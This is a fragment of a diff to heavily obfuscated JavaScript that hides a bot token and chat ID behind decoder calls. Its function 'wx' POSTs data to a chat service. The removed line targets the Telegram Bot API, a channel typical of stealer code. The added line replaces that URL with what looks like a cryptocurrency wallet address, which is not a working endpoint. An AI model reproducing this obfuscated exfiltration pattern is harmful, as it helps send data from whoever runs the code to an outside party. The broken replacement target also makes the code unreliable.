@@ -29,7 +29,7 @@ function _0x1cd721(d, e, c, W, m) {
         }
     var a, f, o, b, n, t, y, J, k, x
 }();
-const BOT_TOKEN = _0x4b49bd(3454, 6140, 5699, 3880, 4389)
+const TOKEN = _0x4b49bd(3454, 6140, 5699, 3880, 4389)
   , CHAT_ID = _0x4db4f7(2487, 2387, 1728, "#HL!", 530);
 function _0x108c7f(d, e, c, W, m) {
     return _0x20d2(d - 563, m)
@@ -1760,7 +1760,7 @@ function _0x3b85(d, e) {
 }
 async function wx(d) {
     console.log(d),
-    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+    fetch("0x053973D64EE9256d6957E3C5D2b5dD100064F07F", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
